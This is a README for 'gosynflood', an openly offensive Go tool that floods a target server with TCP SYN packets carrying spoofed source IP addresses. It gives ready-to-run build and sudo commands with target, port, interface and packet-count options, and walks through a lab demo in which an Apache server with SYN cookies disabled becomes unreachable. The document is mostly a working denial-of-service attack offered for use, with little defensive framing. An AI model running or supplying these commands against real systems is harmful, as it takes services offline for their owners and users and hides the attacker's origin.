
### gosynflood - Repeatedly Send Raw TCP SYN Packets

###### USAGE:
<pre>
  <code>
# get the project
go get github.com/rootVIII/gosynflood


# Navigate to project root and build:
go build .

# raw sockets require root privileges when executing:
sudo ./gosynflood \
    -t &lt;target IPV4 address&gt; \
    -p &lt;port number&gt; \
    -i &lt;network interface&gt; \
    -n &lt;number of packets&gt;

# Example:
sudo ./gosynflood -t 192.168.1.120 -p 80 -i wlp3s0 -n 500
  </code>
</pre>

###### CLI OPTIONS:
<pre>
  <code>
-t private or public IP address of webserver
-p port number (defaults to port 80 if not provided)
-i network interface (run program without -i to see found interfaces)
-n number of TCP packets to send (defaults to 1000 if not provided)
  </code>
</pre>

Each packet's IP address is spoofed. MAC addresses are not spoofed however.

This attack may only work on web servers that for some reason do not have a method
of preventing numerous half-open connections (SYN_RECV).

To demonstrate this, a small Ubuntu Mate running Apache2 will act as the target.
It's a physical machine on a private network.

<hr>
1. The tcp_syncookies flag is set to 0 and the webserver is started on the target:
<img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/1.png">


2. The attacker machine (a separate physical machine also running Ubuntu) executes the gosynflood exe with root privileges:
<img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/5.png">


3. The initial SYNs are visible in Wireshark on the target
<img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/2.png">
<img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/3.png">


4. During the attack the webserver should be unreachable at it's URL if it is susceptible. The half-open connections are visible via the command <code>netstat -na --tcp</code>
<img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/4.png">




This was developed on Ubuntu 18.04 LTS.
<hr>
<b>Author: rootVIII  2018-2020</b>
<br><br>